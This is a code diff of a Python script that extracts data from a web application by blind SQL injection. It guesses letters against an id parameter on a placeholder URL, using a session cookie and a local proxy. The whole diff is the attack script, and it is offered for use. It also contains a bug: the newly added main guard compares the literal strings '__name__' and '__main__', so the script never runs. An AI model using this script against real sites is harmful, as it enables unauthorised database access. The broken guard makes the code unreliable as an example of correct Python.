@@ -5,7 +5,7 @@
 import requests
 import sys
 
-# Ascii letters ordered by the most common letter first
+# Ascii letters ordered by the most occuring letter first
 ascii_letters = "etaoinshrdlcumwfgypbvkjxqz"
 
 url   = "http://foo/bar.php"
@@ -17,18 +17,19 @@ def dbquery(guess):
     request_url = url + "?id=" + query
 
     resp = requests.get(request_url, verify=False,
-        cookies={"Session" : token},
+        cookies={"Session"    : token},
         headers={"User-Agent" : agent},
-        proxies={"http" : "http://localhost:8080"},
+        proxies={"http"       : "http://localhost:8080"},
     )
 
     # Use whatever response content that indiciate that our SQL query returned false
     if "errorStringGoesHere" not in resp.text:
         print(guess)
         for char in ascii_letters:
-            dbquery(guess + c)
+            dbquery(guess + char)
 
         return guess
 
-for c in ascii_letters:
-    dbquery(c)
+if '__name__' == '__main__': 
+    for char in ascii_letters:
+        dbquery(char)
